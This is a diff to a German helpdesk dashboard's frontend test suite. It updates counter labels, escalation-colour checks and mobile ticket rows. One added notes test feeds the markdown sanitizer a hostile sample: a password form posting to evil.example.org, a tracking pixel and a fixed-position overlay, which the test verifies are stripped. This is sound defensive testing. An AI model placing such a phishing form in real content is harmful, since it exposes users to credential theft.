@@ -152,6 +152,8 @@ async function renderWidget(
 
 beforeAll(async () => {
   await i18n.changeLanguage("de");
+  // The memory router restores scroll on navigation; jsdom has no window.scrollTo.
+  vi.spyOn(window, "scrollTo").mockImplementation(() => {});
 });
 
 beforeEach(() => {
@@ -244,16 +246,16 @@ describe("core.counter", () => {
     );
     expect(screen.getByText("Eskaliert")).toBeVisible();
     expect(screen.getByText("2")).toHaveClass("text-danger");
-    expect(screen.getByText("−1 seit gestern")).toHaveClass("text-green");
+    expect(screen.getByText("−1 seit dem letzten Stand")).toHaveClass("text-green");
     expect(container.querySelector("polyline")).toHaveClass("stroke-danger");
   });
 
   it("keeps a rise of a fewer-is-better counter and every change of the others muted", async () => {
     await renderWidget("core.counter", preset("unowned_new"), { status: "ok", data: { value: 5, delta: 2, spark: [3, 5] } });
-    expect(screen.getByText("+2 seit gestern")).toHaveClass("text-muted");
+    expect(screen.getByText("+2 seit dem letzten Stand")).toHaveClass("text-muted");
     cleanup();
     await renderWidget("core.counter", preset("mine_open"), { status: "ok", data: { value: 5, delta: -2, spark: [7, 5] } });
-    expect(screen.getByText("−2 seit gestern")).toHaveClass("text-muted");
+    expect(screen.getByText("−2 seit dem letzten Stand")).toHaveClass("text-muted");
     expect(screen.getByText("5")).toHaveClass("text-ink");
   });
 
@@ -263,7 +265,7 @@ describe("core.counter", () => {
       data: { value: 4, delta: null, spark: [4] },
     });
     expect(screen.getByText("4")).toBeVisible();
-    expect(screen.queryByText(/seit gestern/)).toBeNull();
+    expect(screen.queryByText(/seit dem letzten Stand/)).toBeNull();
     expect(container.querySelector("polyline")).toBeNull();
   });
 
@@ -324,8 +326,9 @@ describe("core.ticket-list", () => {
             ticket(1, { escalation_solution_time: now - (3 * 3600 + 20 * 60) }),
             ticket(2, { escalation_response_time: now + 25 * 60 }),
             ticket(3),
+            ticket(4, { escalation_update_time: now + 45 * 60 }),
           ],
-          total: 3,
+          total: 4,
         },
       },
     );
@@ -333,7 +336,19 @@ describe("core.ticket-list", () => {
     expect(screen.getByTestId("ticket-1-due")).toHaveClass("text-danger");
     expect(screen.getByTestId("ticket-2-due")).toHaveTextContent("in 25 Min.");
     expect(screen.getByTestId("ticket-2-due")).not.toHaveClass("text-danger");
+    // the app's warning window (escalationLevel, 30 min): inside it escalation colour, beyond it muted
+    expect(screen.getByTestId("ticket-2-due")).toHaveClass("text-escalation");
+    expect(screen.getByTestId("ticket-4-due")).toHaveTextContent("in 45 Min.");
+    expect(screen.getByTestId("ticket-4-due")).toHaveClass("text-muted");
     expect(screen.getByTestId("ticket-3-due")).toHaveTextContent("—");
+  });
+
+  it("phone rows show title, customer and due like the Mobile mockup", async () => {
+    await renderWidget("core.ticket-list", preset("mine_open"), {
+      status: "ok",
+      data: { items: [ticket(7, { customer_email: "kunde@example.org" })], total: 1 },
+    });
+    expect(screen.getByTestId("dashboard-ticket-7-customer")).toHaveTextContent("kunde@example.org");
   });
 
   it("offers 'Alle 12 anzeigen' only when total > rows, linking to the matching queue view", async () => {
@@ -433,6 +448,9 @@ describe("core.reminders", () => {
     });
     expect(screen.getByTestId("reminder-1-due")).toHaveClass("text-danger");
     expect(screen.getByTestId("reminder-2-due")).not.toHaveClass("text-danger");
+    // not by colour only
+    expect(screen.getByTestId("reminder-1-due")).toHaveTextContent("Überfällig");
+    expect(screen.getByTestId("reminder-2-due")).not.toHaveTextContent("Überfällig");
     expect(screen.getByText("Ticket 1")).toBeVisible();
   });
 
@@ -551,6 +569,27 @@ describe("core.notes", () => {
     expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
     await act(async () => {});
     expect(w.__x).toBeUndefined();
+  });
+
+  it("drops forms, inputs, images and inline styles from shared notes; links open in a new tab", async () => {
+    await renderWidget(
+      "core.notes",
+      {
+        markdown:
+          'Bitte anmelden:\n\n<form action="https://evil.example.org/x" method="post"><input name="pw" type="password"><button>OK</button></form>\n\n<img src="https://t.example.org/p.gif"> <span style="position:fixed">x</span> [Wiki](https://example.org/wiki)',
+      },
+      { status: "none" },
+    );
+    const body = screen.getByTestId("notes-markdown");
+    expect(body.querySelector("form")).toBeNull();
+    expect(body.querySelector("input")).toBeNull();
+    expect(body.querySelector("button")).toBeNull();
+    expect(body.querySelector("img")).toBeNull();
+    expect(body.querySelector("[style]")).toBeNull();
+    expect(screen.getByText("Bitte anmelden:")).toBeVisible();
+    const wiki = screen.getByRole("link", { name: "Wiki" });
+    expect(wiki).toHaveAttribute("target", "_blank");
+    expect(wiki).toHaveAttribute("rel", "noopener noreferrer");
   });
 
   it("has an empty state", async () => {
